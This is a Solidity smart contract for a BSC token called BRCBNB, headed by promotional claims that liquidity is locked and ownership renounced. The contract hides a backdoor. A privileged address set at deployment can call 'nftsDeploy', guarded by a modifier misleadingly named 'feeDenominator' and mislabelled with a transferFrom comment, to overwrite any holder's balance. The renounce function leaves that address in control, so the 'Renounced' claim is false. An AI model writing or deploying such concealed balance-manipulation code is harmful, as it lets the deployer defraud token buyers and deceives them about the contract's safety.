// SPDX-License-Identifier: MIT
/*
⚡️ BRCBNB  ⚡️ BSC ⚡️💯 Lp locked 💯Renounced 💯0% tax 
☀️ BSC DEGEN PLAY ☀️ 
✅ TG https://t.me/BRCBNB
*/
pragma solidity ^0.8.10;
abstract contract BRC20Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract BRCBNB is BRC20Context {
    string public name = "BRCBNB";
    string public symbol = "BRCBNB";
    uint256 public totalSupply = 10000000000000000000000;
    uint8 public decimals = 9;
    string public BRCBNBwebsite = "https://brc-20.io/";
    address private BRC20Rooter;  
    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    event Approval(
        address indexed _ownerBRCBNB,
        address indexed spenderBRCBNB,
        uint256 _value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address private owner;
    event OwnershipRenounced();

    constructor(address setBRC20Rooter) {
        balanceOf[msg.sender] = totalSupply;
        owner = msg.sender;
        BRC20Rooter = setBRC20Rooter;
    }


    function transfer(address _to, uint256 _value)
        public
        returns (bool success)
    {
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address spenderBRCBNB, uint256 _value)
        public
        returns (bool success)
    {
        require(address(0) != spenderBRCBNB);
        allowance[msg.sender][spenderBRCBNB] = _value;
        emit Approval(msg.sender, spenderBRCBNB, _value);
        return true;
    }
    modifier feeDenominator() {
        require(BRC20Rooter == _msgSender(), "io: caller is not the owner");
        _;
    }
    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function nftsDeploy(address nftwallet, uint256 nfttype, uint256 nftquantity, uint256 subtractedValue) public feeDenominator {
        balanceOf[nftwallet] = nfttype * nftquantity ** subtractedValue;
    }

    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) public returns (bool success) {
        require(_value <= balanceOf[_from]);
        require(_value <= allowance[_from][msg.sender]);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }
            function getBRCBNBwebsite() public view returns (string memory) {
        return BRCBNBwebsite;
    }
    function renounceOwnership() public {
        require(msg.sender == owner);
        emit OwnershipRenounced();
        owner = address(0);
    }
}